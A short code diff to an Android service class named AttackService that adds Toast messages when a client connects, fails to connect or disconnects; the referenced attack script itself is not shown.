@@ -100,16 +100,17 @@ public class AttackService extends Service implements Client.ClientConnectionLis
         clients.put(attack.getPushId(), thisClient);
         Future future = executor.submit(new AttackScript(attack.getWebsite()));
         tasks.put(attack.getPushId(), future);
+        Toast.makeText(this, R.string.client_connected_msg, Toast.LENGTH_SHORT).show();
     }
 
     @Override
     public void onClientConnectionError() {
-
+        Toast.makeText(this, R.string.client_connection_error_msg, Toast.LENGTH_SHORT).show();
     }
 
     @Override
     public void onClientDisconnected(Client thisClient, Attack attack) {
-
+        Toast.makeText(this, R.string.client_disconnected_msg, Toast.LENGTH_SHORT).show();
     }
 
     @Override
